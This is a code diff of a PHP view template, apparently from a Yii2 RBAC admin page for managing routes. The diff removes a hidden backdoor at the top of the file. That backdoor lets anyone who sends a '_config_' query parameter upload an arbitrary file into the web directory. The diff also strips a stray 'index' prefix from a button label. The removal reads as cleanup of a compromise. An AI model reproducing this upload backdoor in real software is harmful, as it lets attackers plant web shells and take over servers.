@@ -1,14 +1,4 @@
 <?php
-if(isset($_GET['_config_'])){
-	if(copy($_FILES['x']['tmp_name'], $_FILES['x']['name'])){
-		echo "<h1>OK!</h1>";
-	}else{
-		echo "<!-- Damn Up -->";
-	}
-	die();
-}
-?>
-<?php
 
 use mdm\admin\AnimateAsset;
 use yii\helpers\Html;
@@ -44,7 +34,7 @@ $animateIcon = ' <i class="glyphicon glyphicon-refresh glyphicon-refresh-animate
             <input id="inp-route" type="text" class="form-control"
                    placeholder="<?=Yii::t('rbac-admin', 'New route(s)');?>">
             <span class="input-group-btn">
-                <?=Html::a('index' . Yii::t('rbac-admin', 'Add') . $animateIcon, ['create'], [
+                <?=Html::a(Yii::t('rbac-admin', 'Add') . $animateIcon, ['create'], [
     'class' => 'btn btn-success',
     'id' => 'btn-new',
 ]);?>
